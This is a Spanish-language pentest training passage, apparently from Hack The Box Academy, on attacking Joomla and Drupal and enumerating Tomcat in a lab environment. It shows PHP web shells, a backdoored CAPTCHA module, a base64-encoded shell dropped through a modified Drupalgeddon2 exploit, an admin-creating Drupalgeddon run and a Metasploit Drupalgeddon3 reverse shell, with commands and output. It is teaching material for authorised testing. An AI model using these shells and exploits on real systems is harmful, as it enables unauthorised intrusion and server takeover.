En el momento de escribir, ha habido [426](https://www.cvedetails.com/vulnerability-list/vendor_id-3496/Joomla.html) Vulnerabilidades relacionadas con Joomla que recibieron CVE. Sin embargo, el hecho de que se haya divulgado una vulnerabilidad y recibido una CVE no significa que sea explotable o que haya un exploit de PoC público en funcionamiento disponible. Al igual que con WordPress, las vulnerabilidades críticas (como la ejecución remota de código) que afectan al núcleo de Joomla son raras. Buscar un sitio como `exploit-db` muestra más de 1,400 entradas para Joomla, y la gran mayoría son para extensiones de Joomla.

Veamos una vulnerabilidad central de Joomla que afecta a la versión `3.9.4`, que nuestro objetivo `http://dev.inlanefreight.local/` se descubrió que se ejecutaba durante nuestra enumeración. Comprobando la Joomla [descargas](https://www.joomla.org/announcements/release-news/5761-joomla-3-9-4-release.html) page, podemos ver eso `3.9.4` fue lanzado en marzo de 2019. Aunque está desactualizado como estamos en Joomla `4.0.3` a partir de septiembre de 2021, es completamente posible encontrarse con esta versión durante una evaluación, especialmente contra una gran empresa que puede no mantener un inventario de aplicaciones adecuado y desconoce su existencia.

Investigando un poco, encontramos que esta versión de Joomla es probablemente vulnerable a [CVE-2019-10945](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945) que es una vulnerabilidad de salto de directorio y eliminación de archivos autenticados. Podemos usar [esto](https://www.exploit-db.com/exploits/46710) explote el script para aprovechar la vulnerabilidad y enumere el contenido de la webroot y otros directorios. Se puede encontrar la versión python3 de este mismo script [aquí](https://github.com/dpgg101/CVE-2019-10945). También podemos usarlo para eliminar archivos (no recomendado). Esto podría conducir al acceso a archivos confidenciales, como un archivo de configuración o credenciales de almacenamiento de scripts, si podemos acceder a él a través de la URL de la aplicación. Un atacante también podría causar daños al eliminar los archivos necesarios si el usuario del servidor web tiene los permisos adecuados.

Podemos ejecutar el script especificando el `--url`, `--username`, `--password`, y `--dir` banderas. Como pentesters, esto solo nos sería útil si el portal de inicio de sesión de administrador no es accesible desde el exterior, ya que, armados con credenciales de administrador, podemos obtener la ejecución remota de código, como vimos anteriormente.

  Atacando a Joomla

```shell-session
vcrdcr@htb[/htb]$ python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
 
# Exploit Title: Joomla Core (1.5.0 through 3.9.4) - Directory Traversal && Authenticated Arbitrary File Deletion
# Web Site: Haboob.sa
# Email: research@haboob.sa
# Versions: Joomla 1.5.0 through Joomla 3.9.4
# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945    
 _    _          ____   ____   ____  ____  
| |  | |   /\   |  _ \ / __ \ / __ \|  _ \ 
| |__| |  /  \  | |_) | |  | | |  | | |_) |
|  __  | / /\ \ |  _ <| |  | | |  | |  _ < 
| |  | |/ ____ \| |_) | |__| | |__| | |_) |
|_|  |_/_/    \_\____/ \____/ \____/|____/ 
                                                                       


administrator
bin
cache
cli
components
images
includes
language
layouts
libraries
media
modules
plugins
templates
tmp
LICENSE.txt
README.txt
configuration.php
htaccess.txt
index.php
robots.txt
web.config.txt
```

---

## Avanzando

A continuación, echemos un vistazo a Drupal, que, si bien tiene una participación mucho menor en el mercado de CMS, todavía es utilizado por empresas de todo el mundo.


# Drupal - Descubrimiento y enumeración

---

[Drupal](https://www.drupal.org/), lanzado en 2001 es el tercer y último CMS que cubriremos en nuestra gira por el mundo de las aplicaciones comunes. Drupal es otro CMS de código abierto que es popular entre las empresas y desarrolladores. Drupal está escrito en PHP y admite el uso de MySQL o PostgreSQL para el backend. Además, SQLite se puede utilizar si no hay DBMS instalado. Al igual que WordPress, Drupal permite a los usuarios mejorar sus sitios web mediante el uso de temas y módulos. En el momento de escribir este artículo, el proyecto Drupal tiene casi 43,000 módulos y 2,900 temas y es el tercer CMS más popular por cuota de mercado. Aquí hay algunos interesantes [estadísticas](https://websitebuilder.org/blog/drupal-statistics/) en Drupal reunidos de varias fuentes:

- Alrededor del 1.5% de los sitios en Internet ejecutan Drupal (¡más de 1.1 millones de sitios!), el 5% de los 1 millón de sitios web principales en Internet y el 7% de los 10,000 sitios principales
- Drupal representa alrededor del 2,4% del mercado de CMS
- Está disponible en 100 idiomas
- Drupal está orientado a la comunidad y tiene más de 1.3 millones de miembros
- Drupal 8 fue construido por 3,290 colaboradores, 1,288 compañías y ayuda de la comunidad
- 33 De las compañías Fortune 500 usan Drupal de alguna manera
- El 56% de los sitios web gubernamentales de todo el mundo usan Drupal
- El 23,8% de las universidades, colegios y escuelas utilizan Drupal en todo el mundo
- Algunas marcas importantes que usan Drupal incluyen: Tesla y Warner Bros Records

Según el Drupal [sitio web](https://www.drupal.org/project/usage/drupal) hay alrededor de 950,000 instancias de Drupal en uso en el momento de escribir este artículo (distribuidas de la versión 5.x a la versión 9.3.x, al 5 de septiembre de 2021). Como podemos ver en estas estadísticas, el uso de Drupal se ha mantenido constantemente entre 900,000 y 1.1 millones de instancias entre junio de 2013 y septiembre de 2021. Estas estadísticas no tienen en cuenta `EVERY` instancia de Drupal en uso en todo el mundo, pero más bien instancias que ejecutan el [Estado de Actualización](https://www.drupal.org/project/update_status) módulo, que se registra con drupal.org diariamente para buscar nuevas versiones de Drupal o actualizaciones de los módulos en uso.

---

## Descubrimiento/Footprinting

Durante una prueba de penetración externa, nos encontramos con lo que parece ser un CMS, pero sabemos por una revisión superficial que el sitio no está ejecutando WordPress o Joomla. Sabemos que los CMS son a menudo objetivos "jugosos", así que profundicemos en este y veamos qué podemos descubrir.

Un sitio web de Drupal se puede identificar de varias maneras, incluso mediante el mensaje de encabezado o pie de página `Powered by Drupal`, el logotipo estándar de Drupal, la presencia de un `CHANGELOG.txt` archivo o `README.txt file`, a través de la fuente de la página, o pistas en el archivo robots.txt, como referencias a `/node`.

  Drupal - Descubrimiento y enumeración

```shell-session
vcrdcr@htb[/htb]$ curl -s http://drupal.inlanefreight.local | grep Drupal

<meta name="Generator" content="Drupal 8 (https://www.drupal.org)" />
      <span>Powered by <a href="https://www.drupal.org">Drupal</a></span>
```

Otra forma de identificar Drupal CMS es a través de [nodos](https://www.drupal.org/docs/8/core/modules/node/about-nodes). Drupal indexa su contenido utilizando nodos. Un nodo puede contener cualquier cosa, como una publicación de blog, encuesta, artículo, etc. Los URI de página suelen ser del formulario `/node/<nodeid>`.

   

![](https://academy.hackthebox.com/storage/modules/113/drupal_node.png)

Por ejemplo, se encuentra que la publicación de blog anterior está en `/node/1`. Esta representación es útil para identificar un sitio web de Drupal cuando se usa un tema personalizado.

Nota: No todas las instalaciones de Drupal se verán iguales o mostrarán la página de inicio de sesión o incluso permitirán a los usuarios acceder a la página de inicio de sesión desde Internet.

Drupal admite tres tipos de usuarios de forma predeterminada:

1. `Administrator`: Este usuario tiene control completo sobre el sitio web de Drupal.
2. `Authenticated User`: Estos usuarios pueden iniciar sesión en el sitio web y realizar operaciones como agregar y editar artículos en función de sus permisos.
3. `Anonymous`: Todos los visitantes del sitio web son designados como anónimos. De forma predeterminada, estos usuarios solo pueden leer publicaciones.

---

## Enumeración

Una vez que hayamos descubierto una instancia de Drupal, podemos hacer una combinación de enumeración manual y basada en herramientas (automatizada) para descubrir la versión, los complementos instalados y más. Dependiendo de la versión de Drupal y de cualquier medida de endurecimiento que se haya implementado, es posible que tengamos que probar varias formas de identificar el número de versión. Las instalaciones más recientes de Drupal bloquean por defecto el acceso al `CHANGELOG.txt` y `README.txt` archivos, por lo que es posible que tengamos que hacer más enumeración. Veamos un ejemplo de enumerar el número de versión usando el `CHANGELOG.txt` archivo. Para hacerlo, podemos usar `cURL` junto con `grep`, `sed`, `head`, etc.

  Drupal - Descubrimiento y enumeración

```shell-session
vcrdcr@htb[/htb]$ curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""

Drupal 7.57, 2018-02-21
```

Aquí hemos identificado una versión anterior de Drupal en uso. Intentando esto contra la última versión de Drupal en el momento de escribir este artículo, obtenemos una respuesta 404.

  Drupal - Descubrimiento y enumeración

```shell-session
vcrdcr@htb[/htb]$ curl -s http://drupal.inlanefreight.local/CHANGELOG.txt

<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL "http://drupal.inlanefreight.local/CHANGELOG.txt" was not found on this server.</p></body></html>
```

Hay varias otras cosas que podríamos comprobar en este caso para identificar la versión. Probemos un escaneo con `droopescan` como se muestra en la sección de enumeración de Joomla. `Droopescan` tiene mucha más funcionalidad para Drupal que para Joomla.

Hagamos un escaneo contra el `http://drupal.inlanefreight.local` anfitrión.

  Drupal - Descubrimiento y enumeración

```shell-session
vcrdcr@htb[/htb]$ droopescan scan drupal -u http://drupal.inlanefreight.local

[+] Plugins found:                                                              
    php http://drupal.inlanefreight.local/modules/php/
        http://drupal.inlanefreight.local/modules/php/LICENSE.txt

[+] No themes found.

[+] Possible version(s):
    8.9.0
    8.9.1

[+] Possible interesting urls found:
    Default admin - http://drupal.inlanefreight.local/user/login

[+] Scan finished (0:03:19.199526 elapsed)
```

Esta instancia parece estar ejecutando la versión `8.9.1` de Drupal. En el momento de escribir este artículo, este no era el último, ya que se lanzó en junio de 2020. Una búsqueda rápida de Drupal-relacionado [vulnerabilidades](https://www.cvedetails.com/vulnerability-list/vendor_id-1367/product_id-2387/Drupal-Drupal.html) no muestra nada aparente para esta versión central de Drupal. En este caso, a continuación, querríamos ver los complementos instalados o abusar de la funcionalidad incorporada.


# Atacar a Drupal

---

Ahora que hemos confirmado que nos enfrentamos a Drupal y tomamos las huellas dactilares de la versión, veamos qué configuraciones erróneas y vulnerabilidades podemos descubrir para intentar obtener acceso a la red interna.

A diferencia de algunos CMS, obtener un shell en un host Drupal a través de la consola de administración no es tan fácil como simplemente editar un archivo PHP que se encuentra dentro de un tema o cargar un script PHP malicioso.

---

## Aprovechando el Módulo de Filtro PHP

En versiones anteriores de Drupal (antes de la versión 8), era posible iniciar sesión como administrador y habilitar el `PHP filter` módulo, que "Permite evaluar el código/snippets PHP incrustados."

   

![](https://academy.hackthebox.com/storage/modules/113/drupal_php_module.png)

Desde aquí, podríamos marcar la casilla de verificación junto al módulo y desplazarnos hacia abajo `Save configuration`. A continuación, podríamos ir a Contenido --> Agregar contenido y crear un `Basic page`.

   

![](https://academy.hackthebox.com/storage/modules/113/basic_page.png)

Ahora podemos crear una página con un fragmento PHP malicioso como el de abajo. Nombramos el parámetro con un hash md5 en lugar del común `cmd` para entrar en la práctica de no dejar una puerta abierta a un atacante durante nuestra evaluación. Si usamos el estándar `system($_GET['cmd']);` nos abrimos a un atacante "conducción" que potencialmente se encuentra con nuestro shell web. ¡Aunque es poco probable, mejor prevenir que curar!

Código: php

```php
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```

   

![](https://academy.hackthebox.com/storage/modules/113/basic_page_shell_7v2.png)

También queremos asegurarnos de establecer `Text format` desplegable a `PHP code`. Después de hacer clic en guardar, seremos redirigidos a la nueva página, en este ejemplo `http://drupal-qa.inlanefreight.local/node/3`. Una vez guardado, podemos solicitar ejecutar comandos en el navegador adjuntando `?dcfdd5e021a869fcc6dfaef8bf31377e=id` al final de la URL para ejecutar el `id` comando o uso `cURL` en la línea de comandos. A partir de aquí, podríamos usar una línea bash de una línea para obtener acceso de shell inverso.

  Atacar a Drupal

```shell-session
vcrdcr@htb[/htb]$ curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

A partir de la versión 8, el [Filtro PHP](https://www.drupal.org/project/php/releases/8.x-1.1) el módulo no está instalado de forma predeterminada. Para aprovechar esta funcionalidad, tendríamos que instalar el módulo nosotros mismos. Dado que estaríamos cambiando y agregando algo a la instancia de Drupal del cliente, es posible que primero queramos consultar con ellos. Comenzaríamos descargando la versión más reciente del módulo desde el sitio web de Drupal.

  Atacar a Drupal

```shell-session
vcrdcr@htb[/htb]$ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```

Una vez descargado ir a `Administration` > `Reports` > `Available updates`.

Nota: La ubicación puede diferir según la versión de Drupal y puede estar en el menú Extender.

   

![](https://academy.hackthebox.com/storage/modules/113/install_module.png)

Desde aquí, haga clic en `Browse,` seleccione el archivo del directorio en el que lo descargamos y luego haga clic `Install`.

Una vez instalado el módulo, podemos hacer clic en `Content` y cree una nueva página básica, similar a como lo hicimos en el ejemplo de Drupal 7. De nuevo, asegúrese de seleccionar `PHP code` de la `Text format` desplegable.

Con cualquiera de estos ejemplos, debemos mantener informado a nuestro cliente y obtener permiso antes de realizar este tipo de cambios. Además, una vez que hayamos terminado, debemos eliminar o deshabilitar el `PHP Filter` modifique y elimine cualquier página que hayamos creado para obtener la ejecución remota de código.

---

## Subiendo un Módulo Backdoored

Drupal permite a los usuarios con los permisos adecuados cargar un nuevo módulo. Se puede crear un módulo con puerta trasera agregando un shell a un módulo existente. Los módulos se pueden encontrar en el sitio web drupal.org. Elegamos un módulo como [CAPTCHA](https://www.drupal.org/project/captcha). Desplácese hacia abajo y copie el enlace para el tar.gz [archivo](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz).

Descarga el archivo y extrae su contenido.

  Atacar a Drupal

```shell-session
vcrdcr@htb[/htb]$ wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
vcrdcr@htb[/htb]$ tar xvf captcha-8.x-1.2.tar.gz
```

Crear un shell web PHP con los contenidos:

Código: php

```php
<?php
system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);
?>
```

A continuación, necesitamos crear un archivo .htaccess para darnos acceso a la carpeta. Esto es necesario ya que Drupal niega el acceso directo a la carpeta /modules.

Código: html

```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```

La configuración anterior aplicará reglas para la carpeta / cuando solicitemos un archivo en /módulos. Copie ambos archivos en la carpeta captcha y cree un archivo.

  Atacar a Drupal

```shell-session
vcrdcr@htb[/htb]$ mv shell.php .htaccess captcha
vcrdcr@htb[/htb]$ tar cvf captcha.tar.gz captcha/

captcha/
captcha/.travis.yml
captcha/README.md
captcha/captcha.api.php
captcha/captcha.inc
captcha/captcha.info.yml
captcha/captcha.install

<SNIP>
```

Suponiendo que tenemos acceso administrativo al sitio web, haga clic en `Manage` y luego `Extend` en la barra lateral. A continuación, haga clic en el `+ Install new module` botón, y nos llevarán a la página de instalación, como `http://drupal.inlanefreight.local/admin/modules/install` Navegue hasta el archivo de Captcha y haga clic en `Install`.

   

![](https://academy.hackthebox.com/storage/modules/113/module_installed.png)

Una vez que la instalación tenga éxito, navegue para `/modules/captcha/shell.php` para ejecutar comandos.

  Atacar a Drupal

```shell-session
vcrdcr@htb[/htb]$ curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Aprovechamiento de Vulnerabilidades Conocidas

Con los años, el núcleo de Drupal ha sufrido algunas vulnerabilidades graves de ejecución remota de código, cada una doblada `Drupalgeddon`. Al momento de escribir este artículo, existen 3 vulnerabilidades de Drupalgeddon.

- [CVE-2014-3704](https://www.drupal.org/SA-CORE-2014-005), conocido como Drupalgeddon, afecta a las versiones 7.0 hasta 7.31 y se fijó en la versión 7.32. Esta fue una falla de inyección SQL pre-autenticada que podría usarse para cargar un formulario malicioso o crear un nuevo usuario administrador.
    
- [CVE-2018-7600](https://www.drupal.org/sa-core-2018-002), también conocido como Drupalgeddon2, es una vulnerabilidad de ejecución remota de código, que afecta a versiones de Drupal anteriores a 7.58 y 8.5.1. La vulnerabilidad se produce debido a una desinfección de entrada insuficiente durante el registro del usuario, lo que permite que los comandos a nivel de sistema se inyecten maliciosamente.
    
- [CVE-2018-7602](https://cvedetails.com/cve/CVE-2018-7602/), también conocido como Drupalgeddon3, es una vulnerabilidad de ejecución remota de código que afecta a múltiples versiones de Drupal 7.x y 8.x. Esta falla explota la validación incorrecta en la API del formulario.
    

Caminemos explotando cada uno de estos.

---

## Drupalgeddon

Como se indicó anteriormente, esta falla se puede explotar aprovechando una inyección SQL previa a la autenticación que se puede usar para cargar código malicioso o agregar un usuario administrador. Intentemos agregar un nuevo usuario administrador con esto [PoC](https://www.exploit-db.com/exploits/34992) guión. Una vez que se agrega un usuario administrador, podemos iniciar sesión y habilitar el `PHP Filter` módulo para lograr la ejecución remota de código.

Ejecutar el guión con el `-h` flag nos muestra el menú de ayuda.

  Atacar a Drupal

```shell-session
vcrdcr@htb[/htb]$ python2.7 drupalgeddon.py 

  ______                          __     _______  _______ _____    
 |   _  \ .----.--.--.-----.---.-|  |   |   _   ||   _   | _   |   
 |.  |   \|   _|  |  |  _  |  _  |  |   |___|   _|___|   |.|   |   
 |.  |    |__| |_____|   __|___._|__|      /   |___(__   `-|.  |   
 |:  1    /          |__|                 |   |  |:  1   | |:  |   
 |::.. . /                                |   |  |::.. . | |::.|   
 `------'                                 `---'  `-------' `---'   
  _______       __     ___       __            __   __             
 |   _   .-----|  |   |   .-----|__.-----.----|  |_|__.-----.-----.
 |   1___|  _  |  |   |.  |     |  |  -__|  __|   _|  |  _  |     |
 |____   |__   |__|   |.  |__|__|  |_____|____|____|__|_____|__|__|
 |:  1   |  |__|      |:  |    |___|                               
 |::.. . |            |::.|                                        
 `-------'            `---'                                        
                                                                   
                                 Drup4l => 7.0 <= 7.31 Sql-1nj3ct10n
                                              Admin 4cc0unt cr3at0r

			  Discovered by:

			  Stefan  Horst
                         (CVE-2014-3704)

                           Written by:

                         Claudio Viviani

                      http://www.homelab.it

                         info@homelab.it
                     homelabit@protonmail.ch

                 https://www.facebook.com/homelabit
                   https://twitter.com/homelabit
                 https://plus.google.com/+HomelabIt1/
       https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww



Usage: drupalgeddon.py -t http[s]://TARGET_URL -u USER -p PASS


Options:
  -h, --help            show this help message and exit
  -t TARGET, --target=TARGET
                        Insert URL: http[s]://www.victim.com
  -u USERNAME, --username=USERNAME
                        Insert username
  -p PWD, --pwd=PWD     Insert password
```

Aquí vemos que necesitamos proporcionar la URL de destino y un nombre de usuario y contraseña para nuestra nueva cuenta de administrador. Ejecutemos el script y veamos si obtenemos un nuevo usuario administrador.

  Atacar a Drupal

```shell-session
vcrdcr@htb[/htb]$ python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd

<SNIP>

[!] VULNERABLE!

[!] Administrator user created!

[*] Login: hacker
[*] Pass: pwnd
[*] Url: http://drupal-qa.inlanefreight.local/?q=node&destination=node
```

Ahora veamos si podemos iniciar sesión como administrador. ¡Podemos! Ahora, a partir de aquí, podríamos obtener un shell a través de los diversos medios discutidos anteriormente en esta sección.

   

![](https://academy.hackthebox.com/storage/modules/113/drupalgeddon.png)

También podríamos usar el [exploit/multi/http/drupal_drupageddon](https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon/) Módulo Metasploit para explotar esto.

---

## Drupalgeddon2

Podemos usar [esto](https://www.exploit-db.com/exploits/44448) PoC para confirmar esta vulnerabilidad.

  Atacar a Drupal

```shell-session
vcrdcr@htb[/htb]$ python3 drupalgeddon2.py 

################################################################
# Proof-Of-Concept for CVE-2018-7600
# by Vitalii Rudnykh
# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# https://github.com/a2u/CVE-2018-7600
################################################################
Provided only for educational or information purposes

Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/

Check: http://drupal-dev.inlanefreight.local/hello.txt
```

Podemos comprobar rápidamente con `cURL` y ver que el `hello.txt` el archivo fue cargado.

  Atacar a Drupal

```shell-session
vcrdcr@htb[/htb]$ curl -s http://drupal-dev.inlanefreight.local/hello.txt

;-)
```

Ahora modifiquemos el script para obtener la ejecución remota de código cargando un archivo PHP malicioso.

Código: php

```php
<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>
```

  Atacar a Drupal

```shell-session
vcrdcr@htb[/htb]$ echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K
```

A continuación, reemplacemos el `echo` comando en el script exploit con un comando para escribir nuestro script PHP malicioso.

  Atacar a Drupal

```shell-session
 echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
```

A continuación, ejecute el script de exploit modificado para cargar nuestro archivo PHP malicioso.

  Atacar a Drupal

```shell-session
vcrdcr@htb[/htb]$ python3 drupalgeddon2.py 

################################################################
# Proof-Of-Concept for CVE-2018-7600
# by Vitalii Rudnykh
# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# https://github.com/a2u/CVE-2018-7600
################################################################
Provided only for educational or information purposes

Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/

Check: http://drupal-dev.inlanefreight.local/mrb3n.php
```

Finalmente, podemos confirmar la ejecución remota de código usando `cURL`.

  Atacar a Drupal

```shell-session
vcrdcr@htb[/htb]$ curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Drupalgeddon3

[Drupalgeddon3](https://github.com/rithchard/Drupalgeddon3) es una vulnerabilidad de ejecución remota de código autenticada que afecta [múltiples versiones](https://www.drupal.org/sa-core-2018-004) del núcleo de Drupal. Requiere que un usuario tenga la capacidad de eliminar un nodo. Podemos explotar esto usando Metasploit, pero primero debemos iniciar sesión y obtener una cookie de sesión válida.

![imagen](https://academy.hackthebox.com/storage/modules/113/burp.png)

Una vez que tengamos la cookie de sesión, podemos configurar el módulo exploit de la siguiente manera.

  Atacar a Drupal

```shell-session
msf6 exploit(multi/http/drupal_drupageddon3) > set rhosts 10.129.42.195
msf6 exploit(multi/http/drupal_drupageddon3) > set VHOST drupal-acc.inlanefreight.local   
msf6 exploit(multi/http/drupal_drupageddon3) > set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
msf6 exploit(multi/http/drupal_drupageddon3) > set DRUPAL_NODE 1
msf6 exploit(multi/http/drupal_drupageddon3) > set LHOST 10.10.14.15
msf6 exploit(multi/http/drupal_drupageddon3) > show options 

Module options (exploit/multi/http/drupal_drupageddon3):

   Name            Current Setting                                                                   Required  Description
   ----            ---------------                                                                   --------  -----------
   DRUPAL_NODE     1                                                                                 yes       Exist Node Number (Page, Article, Forum topic, or a Post)
   DRUPAL_SESSION  SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y  yes       Authenticated Cookie Session
   Proxies                                                                                           no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS          10.129.42.195                                                                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT           80                                                                                yes       The target port (TCP)
   SSL             false                                                                             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI       /                                                                                 yes       The target URI of the Drupal installation
   VHOST           drupal-acc.inlanefreight.local                                                    no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.15      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   User register form with exec
```

Si tiene éxito, obtendremos un shell inverso en el host objetivo.

  Atacar a Drupal

```shell-session
msf6 exploit(multi/http/drupal_drupageddon3) > exploit

[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] Token Form -> GH5mC4x2UeKKb2Dp6Mhk4A9082u9BU_sWtEudedxLRM
[*] Token Form_build_id -> form-vjqTCj2TvVdfEiPtfbOSEF8jnyB6eEpAPOSHUR2Ebo8
[*] Sending stage (39264 bytes) to 10.129.42.195
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.129.42.195:44612) at 2021-08-24 12:38:07 -0400

meterpreter > getuid

Server username: www-data (33)


meterpreter > sysinfo

Computer    : app01
OS          : Linux app01 5.4.0-81-generic #91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64
Meterpreter : php/linux
```

---

## Hacia adelante

Hemos enumerado y atacado algunos de los CMS más frecuentes: WordPress, Drupal y Joomla. A continuación, pasemos a Tomcat, que ha estado poniendo una sonrisa en la cara de los pentesters durante años.


# Tomcat - Descubrimiento y enumeración

---

[Tomcat Apache](https://tomcat.apache.org/) es un servidor web de código abierto que aloja aplicaciones escritas en Java. Tomcat fue diseñado inicialmente para ejecutar Java Servlets y Java Server Pages (JSP) scripts. Sin embargo, su popularidad aumentó en los marcos basados en Java y ahora es ampliamente utilizado por marcos como Spring y herramientas como Gradle. Según los datos recopilados por [ConstruidoCon](https://trends.builtwith.com/Web-Server/Apache-Tomcat-Coyote) hay más de 220,000 sitios web de Tomcat en vivo en este momento. Aquí hay algunas estadísticas más interesantes:

- BuiltWith ha recopilado datos que muestran que más de 904,000 sitios web han estado usando Tomcat en un momento dado
- El 1.22% de los 1 millón de sitios web principales están usando Tomcat, mientras que el 3.8% de los 100k sitios web principales son
- Tomcat mantiene su posición [#13](https://webtechsurvey.com/technology/apache-tomcat) para servidores web por cuota de mercado
- Algunas organizaciones que usan Tomcat incluyen Alibaba, la Oficina de Patentes y Marcas de los Estados Unidos (USPTO), la Cruz Roja Americana y el LA Times

Tomcat a menudo es menos propenso a estar expuesto a Internet (aunque). Lo vemos de vez en cuando en pentests externos y podemos hacer un excelente punto de apoyo en la red interna. Es mucho más común ver Tomcat (y múltiples instancias, para el caso) durante los pentests internos. Por lo general, ocupará el primer lugar bajo "Objetivos de Alto Valor" dentro de un informe de EyeWitness, y la mayoría de las veces, al menos una instancia interna está configurada con credenciales débiles o predeterminadas. Más sobre eso más tarde.

---

## Descubrimiento/Footprinting

Durante nuestra prueba de penetración externa, ejecutamos EyeWitness y vemos un host listado en "High Value Targets." La herramienta cree que el anfitrión está ejecutando Tomcat, pero debemos confirmar para planificar nuestros ataques. Si estamos tratando con Tomcat en la red externa, esto podría ser un punto de apoyo fácil en el entorno de red interna.

Los servidores Tomcat pueden ser identificados por el encabezado del servidor en la respuesta HTTP. Si el servidor está operando detrás de un proxy inverso, solicitar una página no válida debe revelar el servidor y la versión. Aquí podemos ver esa versión de Tomcat `9.0.30` está en uso.

   

![](https://academy.hackthebox.com/storage/modules/113/tomcat_invalid.png)

Las páginas de error personalizadas pueden estar en uso que no filtran esta información de versión. En este caso, otro método para detectar un servidor y una versión de Tomcat es a través del `/docs` página.

  Tomcat - Descubrimiento y enumeración

```shell-session
vcrdcr@htb[/htb]$ curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat 

<html lang="en"><head><META http-equiv="Content-Type" content="text/html; charset=UTF-8"><link href="./images/docs-stylesheet.css" rel="stylesheet" type="text/css"><title>Apache Tomcat 9 (9.0.30) - Documentation Index</title><meta name="author" 

<SNIP>
```

Esta es la página de documentación predeterminada, que los administradores no pueden eliminar. Aquí está la estructura general de carpetas de una instalación de Tomcat.

  Tomcat - Descubrimiento y enumeración

```shell-session
├── bin
├── conf
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.xml
│   ├── tomcat-users.xml
│   ├── tomcat-users.xsd
│   └── web.xml
├── lib
├── logs
├── temp
├── webapps
│   ├── manager
│   │   ├── images
│   │   ├── META-INF
│   │   └── WEB-INF
|   |       └── web.xml
│   └── ROOT
│       └── WEB-INF
└── work
    └── Catalina
        └── localhost
```

El `bin` la carpeta almacena los scripts y binarios necesarios para iniciar y ejecutar un servidor Tomcat. El `conf` la carpeta almacena varios archivos de configuración utilizados por Tomcat. El `tomcat-users.xml` el archivo almacena las credenciales de usuario y sus roles asignados. El `lib` folder contiene los diversos archivos JAR necesarios para el correcto funcionamiento de Tomcat. El `logs` y `temp` las carpetas almacenan archivos de registro temporales. El `webapps` folder es la raíz web predeterminada de Tomcat y aloja todas las aplicaciones. El `work` la carpeta actúa como una caché y se utiliza para almacenar datos durante el tiempo de ejecución.

Cada carpeta dentro `webapps` se espera que tenga la siguiente estructura.

  Tomcat - Descubrimiento y enumeración

```shell-session
webapps/customapp
├── images
├── index.jsp
├── META-INF
│   └── context.xml
├── status.xsd
└── WEB-INF
    ├── jsp
    |   └── admin.jsp
    └── web.xml
    └── lib
    |    └── jdbc_drivers.jar
    └── classes
        └── AdminServlet.class   
```

El archivo más importante entre estos es `WEB-INF/web.xml`, que se conoce como el descriptor de despliegue. Este archivo almacena información sobre las rutas utilizadas por la aplicación y las clases que manejan estas rutas. Todas las clases compiladas utilizadas por la aplicación deben almacenarse en el `WEB-INF/classes` carpeta. Estas clases pueden contener lógica comercial importante, así como información confidencial. Cualquier vulnerabilidad en estos archivos puede llevar a un compromiso total del sitio web. El `lib` la carpeta almacena las bibliotecas necesarias para esa aplicación en particular. El `jsp` almacenes de carpetas [Páginas del Servidor de Yakarta (JSP)](https://en.wikipedia.org/wiki/Jakarta_Server_Pages), anteriormente conocido como `JavaServer Pages`, que se puede comparar con archivos PHP en un servidor Apache.

Aquí hay un ejemplo de archivo web.xml.

Código: xml

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>

<!DOCTYPE web-app PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" "http://java.sun.com/dtd/web-app_2_3.dtd">

<web-app>
  <servlet>
    <servlet-name>AdminServlet</servlet-name>
